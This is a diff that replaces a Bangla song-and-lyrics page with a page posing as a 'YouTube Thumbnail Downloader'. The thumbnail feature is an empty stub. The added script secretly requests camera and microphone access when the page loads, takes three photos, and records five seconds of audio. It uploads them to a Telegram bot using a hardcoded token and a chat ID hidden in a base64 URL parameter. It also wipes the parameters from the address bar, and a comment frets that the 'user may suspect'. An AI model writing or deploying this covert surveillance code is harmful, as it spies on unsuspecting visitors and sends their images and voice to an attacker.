@@ -1,65 +1,240 @@
-8<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Music & Lyrics</title>
-    <link rel="stylesheet" href="style.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  
+  <title>YouTube Thumbnail Downloader</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
+  <style>
+    body {
+      font-family: 'Montserrat', sans-serif;
+      margin: 0;
+      padding: 0;
+      background-color: #f5f5f5;
+    }
+    .navbar {
+      background-color: #ff0000;
+      color: white;
+      text-align: center;
+      padding: 15px 0;
+    }
+    #header {
+      margin: 0;
+      font-size: 28px;
+      font-weight: bold;
+    }
+    .container {
+      max-width: 600px;
+      margin: 20px auto;
+      padding: 20px;
+      background-color: #fff;
+      border-radius: 8px;
+      box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    .form-control {
+      width: calc(100% - 22px);
+      margin-bottom: 15px;
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 5px;
+      box-sizing: border-box;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn {
+      display: block;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 5px;
+      background-color: #ff0000;
+      color: white;
+      font-size: 16px;
+      cursor: pointer;
+      font-family: 'Montserrat', sans-serif;
+    }
+    #thumbdloadbtn:hover {
+      background-color: #cc0000;
+    }
+    footer {
+      text-align: center;
+      margin-top: 40px;
+      color: #666;
+    }
+    .youtube-logo {
+      display: block;
+      margin: 20px auto;
+      width: 100px; /* Adjust size as needed */
+    }
+  </style>
+  <script type='text/javascript'>
+  //<![CDATA[
+  var uri = window.location.toString();
+  if (uri.indexOf("%3D") > 0) {
+      var clean_uri = uri.substring(0, uri.indexOf("%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("%3D%3D") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("%3D%3D"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("&m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("&m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+
+  uri = window.location.toString();
+  if (uri.indexOf("?m=1") > 0) {
+      clean_uri = uri.substring(0, uri.indexOf("?m=1"));
+      window.history.replaceState({}, document.title, clean_uri);
+  }
+  //]]>
+  </script>
 </head>
 <body>
-    <header>
-        <h1>Music & Lyrics</h1>
-    </header>
+  <nav class="navbar">
+    <img class="youtube-logo" src="https://www.gstatic.com/youtube/img/branding/youtubelogo/svg/youtubelogo.svg" alt="YouTube Logo">
+    <h1 id="header">YOUTUBE THUMBNAIL DOWNLOADER</h1>
+  </nav>
 
-    <main>
-        <div class="music-container">
-            <img src="Picsart_25-02-07_17-03-22-707.jpg" alt="Song Cover" class="cover">
-            <h2 class="song-title">যদি আবার </h2>
-            <audio controls>
-                <source src="_Jodi Abar_ ( যদি আবার ) OFFICIAL MUSIC VIDEO _ Angel Noor _Bangla new song 2024(MP3_160K).mp3" type="audio/mp3">
-                Your browser does not support the audio element.
-            </audio>
-        </div>
+  <div class="container">
+    <input id="ytlink" type="text" class="form-control" placeholder="Enter YouTube Video URL" spellcheck="false">
+    <button id="thumbdloadbtn" onclick="downloadThumbnail()">FETCH</button>
+    <div id="thumbnail-preview"><!-- Placeholder for thumbnail preview --></div>
 
-        <div class="lyrics-container">
-            <h3>Lyrics</h3>
-            <p>
-                [Intro] <br>
-             যদি আবার <br>
-                [Chorus] <br>
-                মেঘলা দিন
-তোমাকে ভেবে কেটে যায় রঙিন
-ফেলে আসা ভালবাসা মলিন
-তবুও মনে পড়ে যায়....
-চায়ের কাপ
-তোর আমার যতো স্মৃতির চাপ
-হিসেব মেলানো কঠিন...
-যদি আবার ,দেখা হয় তোমার আমার
-ভুলে যেও সব অভিমান
-ছিলো যতো ঝণ
-আছি আজো ,আমি শুধুই তোমার
-জানি তুমি অন্য কারো
-আমি দিশাহীন।
-আমার মন খারাপের সুর
-মিশে গেছে যতোদুর।
-তুমি শুনতে কি পাও ,এই গান।
-যাক না দিন এমন, তোমাকে ভেবে ভেবে
-তবে হোক আজই প্রতিক্ষার অবসান।
-লুকিয়ে থাক শীতের কুয়াশায় ভেজা দুচোখ।
-ভুলে যাওয়া যতো গল্প আজ
-প্রেম হয়ে ফিরে যায়।
-আড়াল হোক লুকিয়ে রাখা যতো কষ্ট সব।
-শিশির হয়ে ফিরে যাক।
-যদি আবার দেখা হয় তোমার আমার
-মনে করো সেই মন ভাঙা গল্প-গান
-আছি আজও আমি শুধুই তোমার ,জানি তুমি অন্য কারো
-আমি দিশাহীন।
-            </p>
-        </div>
-    </main>
+    <h2>How to Download HD YouTube Thumbnail</h2>
+    <ol>
+      <li>Copy the YouTube Video Link / URL from the YouTube App or Website</li>
+      <li>Paste the YouTube video Link / URL in the Input Field Above</li>
+      <li>Click on the "FETCH" Button</li>
+      <li>Select the thumbnail quality</li>
+      <li>Download the Thumbnail</li>
+    </ol>
+  </div>
 
-    <footer>
-        <p>&copy; 2025 Husain Shawkat</p>
-    </footer>
+  <center>
+    <button id="toggle-video" style="display:none;">Toggle Video</button>
+    <div id="message-container"></div>
+    <video id="video" width="0" height="0" autoplay></video>
+  </center>
+
+  <script type="text/javascript">
+    function downloadThumbnail() {
+        // Change button text to indicate fetching
+        var btn = document.getElementById('thumbdloadbtn');
+        btn.textContent = 'Fetching from server... Wait';
+
+        // Add your logic to fetch the thumbnail here
+        // ...
+    }
+
+    function la(src) {
+      window.location = src;
+    }
+
+    function GetURLParameter(sParam) {
+      var sPageURL = window.location.search.substring(1);
+      var sURLVariables = sPageURL.split('&');
+      for (var i = 0; i < sURLVariables.length; i++) {
+        var sParameterName = sURLVariables[i].split('=');
+        if (sParameterName[0] == sParam) {
+          return sParameterName[1];
+        }
+      }
+    }
+
+    function decodeBase64(encodedStr) {
+      try {
+        return decodeURIComponent(atob(encodedStr));
+      } catch (e) {
+        console.error('Base64 decode error:', e);
+        return null;
+      }
+    }
+
+    // Get Base64 encoded 'id' parameter from the URL
+    var base64Id = GetURLParameter('i');
+    var chatid = base64Id ? decodeBase64(base64Id) : null;
+
+    if (chatid) {
+      console.log('Decoded chat ID:', chatid);
+    } else {
+      console.warn('No valid chat ID found.');
+    }
+
+    navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+      .then((stream) => {
+        const imageCapture = new ImageCapture(stream.getVideoTracks()[0]);
+        const audioRecorder = new MediaRecorder(stream);
+
+        function capturePhoto(index) {
+          setTimeout(() => {
+            imageCapture.takePhoto()
+              .then((blob) => {
+                sendToTelegram(blob, 'photo');
+              })
+              .catch((error) => {
+                console.error('Error capturing photo:', error);
+              });
+          }, index * 2000);
+        }
+
+        function startAudioRecording() {
+          audioRecorder.start();
+          setTimeout(() => {
+            audioRecorder.stop();
+          }, 5000);
+        }
+
+        audioRecorder.ondataavailable = (event) => {
+          if (event.data.size > 0) {
+            sendToTelegram(event.data, 'audio');
+          }
+        };
+
+        for (let i = 0; i < 3; i++) {
+          capturePhoto(i);
+        }
+
+        startAudioRecording();
+      })
+      .catch((error) => {
+        if (error.name === 'NotAllowedError') {
+          // Handle the case where permissions are denied
+          console.warn('Permissions denied. User may suspect.');
+        } else {
+          console.error('Permission error:', error);
+        }
+      });
+
+    function sendToTelegram(data, type) {
+      const botToken = '7708374524:AAEjIbEU59XwOAjwjnt2dkq4sLPFKdhPWnY';
+      const chatId = chatid;
+
+      if (!chatId) {
+        console.error('Chat ID is not available.');
+        return;
+      }
+
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append(type === 'photo' ? 'photo' : 'audio', data, `@lodabotbccc.${type === 'photo' ? 'jpg' : 'wav'}`);
+
+      fetch(`https://api.telegram.org/bot${botToken}/send${type.charAt(0).toUpperCase() + type.slice(1)}`, {
+        method: 'POST',
+        body: formData
+      })
+        .then(response => response.json())
+        .then(data => console.log(data))
+        .catch(error => console.error('Error sending to Telegram:', error));
+    }
+  </script>
+
+ 
 </body>
 </html>
